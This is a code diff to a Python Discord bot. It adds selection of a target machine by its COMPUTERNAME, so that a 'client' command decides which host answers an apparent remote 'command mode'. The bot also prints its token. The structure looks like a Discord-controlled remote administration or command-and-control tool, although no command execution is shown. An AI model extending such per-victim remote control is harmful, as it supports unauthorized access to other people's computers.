@@ -28,6 +28,9 @@ if not token:
     token = os.getenv("Ethan")
 print(f"Token value: {token}")
 
+clientName = os.environ.get('COMPUTERNAME', 'Unknown')
+selectedClient = "None"
+
 timeout = 1
 command_mode = False
 
@@ -71,6 +74,18 @@ class MyClient(discord.Client):
         try:
             
             if not command_mode:
+                if message.content.startswith('client '):
+                    global selectedClient
+                    selectedClient = message.content[7:]
+                    if selectedClient == 'list':
+                        await message.channel.send(f'Current selected client: {selectedClient}\nAvailable clients: {clientName}')
+                        return
+                    await message.channel.send(f'Selected client set to {selectedClient}')
+                    return
+                
+                if not selectedClient == clientName:
+                    return
+                
                 if f'{message.content}' == 'cmdtoggle':
                    command_mode = True
                    await message.channel.send('Command mode enabled. Type "cmdtoggle" again to disable.')
